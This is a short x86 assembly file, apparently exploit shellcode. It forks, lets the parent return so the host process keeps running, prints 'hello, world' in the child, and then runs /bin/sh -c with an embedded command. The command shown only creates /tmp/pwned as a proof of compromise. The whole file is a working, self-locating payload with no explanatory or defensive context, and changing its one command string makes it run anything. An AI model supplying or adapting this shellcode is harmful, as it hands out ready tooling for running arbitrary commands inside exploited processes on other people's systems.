[bits 32]

        push 2                  ; SYS_fork
        pop eax
        int 0x80
        test eax, eax
        je payload
        ret

payload:
        jmp short bottom
top:

        push byte `\n`
        push 'orld'
        push 'o, w'
        push 'hell'
        mov ecx, esp
        push byte 1
        pop ebx
        push byte 13
        pop edx
        push byte 4
        pop eax
        int 0x80
        add esp, 16

        pop edx                 ; cmd
        push `-c\0\0`
        mov ecx, esp
        push `/sh\0`
        push '/bin'
        mov ebx, esp

        xor eax, eax
        push eax
        push edx
        push ecx
        push ebx                ; path = '/bin/sh'

        mov ecx, esp            ; argv = ['/bin/sh', '-c', cmd, NULL]

        xor edx, edx

        push byte 11
        pop eax

        int 0x80

        add esp, 4 * 7
        ret

bottom:
        call top
cmd:
        db 'touch /tmp/pwned', 0